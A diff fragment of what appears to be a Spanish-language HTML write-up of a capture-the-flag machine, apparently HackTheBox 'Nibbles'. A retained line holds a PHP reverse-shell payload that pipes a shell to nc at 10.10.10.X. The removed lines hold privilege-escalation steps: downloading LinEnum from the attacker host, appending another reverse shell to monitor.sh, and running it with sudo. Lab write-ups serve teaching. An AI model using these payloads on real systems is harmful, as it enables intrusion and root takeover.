@@ -48,14 +48,7 @@
                 <h4>Obtención de una Shell Reversa</h4>
                 <pre><code>
 <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.X 1234 >/tmp/f"); ?>
-                </code></pre>
-                <h3>Fase II: Escalada de Privilegios</h3>
-                <h4>Uso de LinEnum</h4>
-                <pre><code>wget http://10.10.10.X:1234/LinEnum.sh</code></pre>
-                <h4>Abuso de permisos en scripts</h4>
-                <pre><code>echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.X 1235 >/tmp/f' | tee -a monitor.sh</code></pre>
-                <h4>Obtención de acceso root</h4>
-                <pre><code>sudo /home/nibbler/personal/stuff/monitor.sh</code></pre>
+               
             </div>
         </section>
     </main>
